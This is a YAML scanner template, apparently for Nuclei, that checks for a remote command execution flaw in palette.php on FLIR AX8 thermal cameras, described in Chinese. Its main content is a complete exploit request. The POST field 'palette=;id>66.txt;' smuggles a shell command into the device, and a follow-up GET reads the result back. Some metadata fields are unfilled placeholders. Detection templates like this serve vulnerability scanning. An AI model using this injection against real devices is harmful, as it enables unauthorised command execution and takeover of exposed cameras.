id: FLIR-AX8-palette-rce
info:
  name: Template Name
  author: wangzong
  severity: high
  description: FLIR-AX8热成像仪palette.php存在远程命令执行漏洞，允许攻击者在目标服务器上执行任意系统命令，可能导致服务器被完全控制、数据泄露或破坏，严重威胁系统安全。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /palette.php HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 19
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        palette=;id>66.txt;
      - |+
        GET /66.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"